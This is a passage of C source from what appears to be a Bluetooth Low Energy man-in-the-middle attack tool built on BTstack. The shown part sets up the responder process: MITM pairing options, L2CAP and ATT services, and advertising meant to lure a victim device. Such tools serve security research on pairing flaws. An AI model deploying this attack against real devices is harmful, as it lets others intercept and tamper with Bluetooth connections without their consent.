				raise(SIGINT);
				break;
			default:
				printf("%s: attack variant is INVALID\n", prnt_pairing_role());
				raise(SIGINT);
				break;
		}

	}
	else /* Responder (parent) */
	{
		/* So we dont read away data from stdin */
		close(STDIN_FILENO);
		/* Configure InterProcessComms */
		ipc_read = responder_ipc_read;
		ipc_write = responder_ipc_write;

		hci_event_callback_registration.callback = &responder_hci_packet_handler;
		hci_add_event_handler(&hci_event_callback_registration);

		l2cap_init();
		le_device_db_init();

		register_mitm_options();
		sm_init();

		/* Register MITM L2CAP services at attack initiator */
		l2cap_register_packet_handler(&l2cap_mitm_responder_packet_handler);
		l2cap_le_register_service(&l2cap_mitm_responder_packet_handler, TSPX_le_psm, LEVEL_2);

		/* setup ATT server */
		att_server_init(responder_profile_data, NULL, NULL);

		/* Setup advertisements */
		uint16_t adv_int_min = 0x0030;
		uint16_t adv_int_max = 0x0030;
		uint8_t adv_type = 0;
		bd_addr_t null_addr;
		memset(null_addr, 0, 6);
		gap_advertisements_set_params(adv_int_min, adv_int_max, adv_type, 0, null_addr, 0x07, 0x00);
		gap_advertisements_set_data(adv_data_len, (uint8_t *)adv_data);
		gap_advertisements_enable(1);

		sm_event_callback_registration.callback = &responder_sm_packet_handler;
		sm_add_event_handler(&sm_event_callback_registration);

		// Register for ATT
		att_server_register_packet_handler(responder_sm_packet_handler);

		hci_power_control(HCI_POWER_ON);
		printf("%s: Initialized\n", prnt_pairing_role());
	}

	btstack_run_loop_execute();

	free(adv_data);
	return 0;
}
